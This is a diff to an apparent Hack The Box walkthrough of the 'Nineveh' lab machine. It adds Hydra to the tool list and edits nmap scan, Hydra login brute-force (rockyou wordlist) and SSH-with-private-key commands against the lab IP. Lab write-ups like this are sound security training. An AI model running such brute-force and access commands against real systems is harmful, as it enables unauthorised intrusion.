@@ -48,14 +48,15 @@ editPost:
 
 - Nmap
 - Searchsploit
-- 
+- Hydra
+- Knock 
 
 ## Port Scanning
 
 Other room, other port scan.
 
 ```bash
-nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oN escaneo 
+ nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.43 -oN escaneo 
 ```
 ![Untitled](/HTB/nmap-nineveh.png)
 
@@ -73,8 +74,8 @@ one on each url.
 
 After trying some basic SQL injections and some basic names I decided to brute force with Hydra. With the following commands:
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /db/index.php:"password=^PASS^&proc_login=^USER^:Incorrect password."
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /department/login.php:"password=^PASS^&proc_login=^USER^:Invalid password."
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /db/index.php:"password=^PASS^&proc_login=^USER^:Incorrect password."
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form /department/login.php:"password=^PASS^&proc_login=^USER^:Invalid password."
 ```
 
 ![Untitled](/HTB/db_nineveh.png)
@@ -157,7 +158,7 @@ So if I do this sequence:
 I can open ssh port and connect by id_rsa that I found before ...
 
 ```bash
-knock nineveh.htb 571 290 911
+ ssh -i id_rsa ambrois@10.10.10.43
 ```
 So I'm now ambrois ...
 
